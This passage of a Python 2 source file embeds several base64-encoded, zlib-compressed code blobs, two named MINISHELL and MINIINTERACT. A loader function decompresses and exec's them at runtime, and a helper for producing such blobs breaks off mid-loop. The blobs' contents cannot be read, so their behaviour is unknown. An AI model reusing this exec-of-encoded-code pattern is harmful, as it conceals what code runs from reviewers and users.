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
CwG+osPIJfn/Ac1rDI0=
"""
MINISHELL ="""
eNpVjjEPwiAQhXcS/gMjJKTR1YRNByebWCfjUOGqTQpHDvj/YqmDt9zlvbz33UTo
RSrPSGghJTH7iJRFjxGC7s/9SV+H4+U2cLY5C9pxAc7aDhbdHF7CbHr3ghwJJiAC
93Ol4szBJNIblkVa79SBM1En7mtwRX1VnbLDks1KrXftMA2uW9QMVEC1KEEuFGpD
Z9H7EmY7ZpDqvnt0DioW5N+DNcXZB4ERTuw=
"""
MINIINTERACT="""
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
AXXfkDc=
"""
import new,zlib,base64
def loadmodule(obj,code):
    exec zlib.decompress(base64.b64decode(code)) in obj.__dict__
    return obj
def gencode(fname,foutname,ll=64):
    d = base64.b64encode(zlib.compress(file(fname,'rb').read(),9))
    p = 0
    fout = file(foutname,'wb')
    fout.write('"""\n')
    while True:
        pe = p+ll
        if pe>len(d): pe = len(d)
        fout.write(d[p:pe])
